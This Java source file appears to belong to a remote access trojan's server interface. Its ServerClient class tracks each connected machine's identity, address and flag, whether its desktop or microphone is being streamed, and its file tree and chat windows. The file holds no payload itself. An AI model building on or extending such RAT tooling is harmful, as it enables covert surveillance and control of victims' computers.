package de.sogomn.rat.server.gui;

import javax.swing.ImageIcon;

import de.sogomn.rat.ActiveConnection;

final class ServerClient {
	
	private boolean loggedIn;
	
	private String name, os, version;
	private ImageIcon flag;
	private boolean streamingDesktop, streamingVoice;
	private long ping;
	
	final ActiveConnection connection;
	final DisplayPanel displayPanel;
	final FileTree fileTree;
	final ChatWindow chat;
	
	public ServerClient(final ActiveConnection connection) {
		this.connection = connection;
		
		displayPanel = new DisplayPanel(this);
		fileTree = new FileTree(this);
		chat = new ChatWindow(this);
	}
	
	public void logIn(final String name, final String os, final String version, final ImageIcon flag) {
		this.name = name;
		this.os = os;
		this.version = version;
		this.flag = flag;
		
		final String title = name + " " + getAddress();
		
		displayPanel.setTitle(title);
		fileTree.setTitle(title);
		chat.setTitle(title);
		
		loggedIn = true;
	}
	
	public void logOut() {
		loggedIn = false;
		
		System.err.println();
		System.err.println("THE FOLLOWING IS A JVM BUG!");
		displayPanel.close();
		fileTree.close();
		chat.close();
		System.err.println();
	}
	
	public void addListener(final IGuiController controller) {
		displayPanel.addListener(controller);
		fileTree.addListener(controller);
		chat.addListener(controller);
	}
	
	public void removeListener(final IGuiController controller) {
		displayPanel.removeListener(controller);
		fileTree.removeListener(controller);
		chat.removeListener(controller);
	}
	
	public void setStreamingDesktop(final boolean streamingDesktop) {
		this.streamingDesktop = streamingDesktop;
	}
	
	public void setStreamingVoice(final boolean streamingVoice) {
		this.streamingVoice = streamingVoice;
	}
	
	public void setPing(final long ping) {
		this.ping = ping;
	}
	
	public String getName() {
		return name;
	}
	
	public ImageIcon getFlag() {
		return flag;
	}
	
	public String getAddress() {
		return connection.getAddress();
	}
	
	public String getOs() {
		return os;
	}
	
	public String getVersion() {
		return version;
	}
	
	public boolean isLoggedIn() {
		return loggedIn;
	}
	
	public boolean isStreamingDesktop() {
		return streamingDesktop;
	}
	
	public boolean isStreamingVoice() {
		return streamingVoice;
	}
	
	public long getPing() {
		return ping;
	}
	
}
